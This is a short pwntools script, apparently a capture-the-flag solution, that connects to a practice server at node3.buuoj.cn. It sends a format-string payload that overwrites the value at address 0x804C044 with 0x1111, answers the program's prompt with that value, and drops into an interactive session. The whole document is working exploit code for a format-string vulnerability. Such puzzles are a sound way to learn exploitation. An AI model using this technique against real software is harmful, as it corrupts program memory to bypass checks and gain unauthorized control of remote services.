from pwn import *
context(log_level='debug')
#io = process("./pwn")
io = remote('node3.buuoj.cn',25276)
dword_804C044 = 0x804C044
io.recvuntil("name:")
payload = fmtstr_payload(10,{dword_804C044:0x1111})
io.sendline(payload)
io.recvuntil(":")
io.sendline(str(0x1111))
io.interactive()